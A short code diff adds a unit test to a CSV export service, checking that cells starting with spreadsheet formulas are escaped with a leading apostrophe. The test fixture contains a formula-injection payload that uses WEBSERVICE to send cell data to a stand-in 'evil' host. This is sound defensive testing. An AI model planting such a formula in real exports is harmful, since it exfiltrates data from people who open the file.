@@ -103,4 +103,19 @@ describe('AuditService', () => {
     expect(csv).toContain('variant');
     expect(csv).toContain('1920x1080');
   });
+
+  it('neutralises a spreadsheet formula in an exported cell', async () => {
+    events.findForExport.mockResolvedValue([
+      {
+        ...row,
+        branchName: '=WEBSERVICE("http://evil/?"&A1)',
+        testName: '+1+1',
+      },
+    ]);
+
+    const csv = await service.exportCsv({ projectName: 'shop' });
+
+    expect(csv).toContain(`"'=WEBSERVICE(""http://evil/?""&A1)"`);
+    expect(csv).toContain(`"'+1+1"`);
+  });
 });
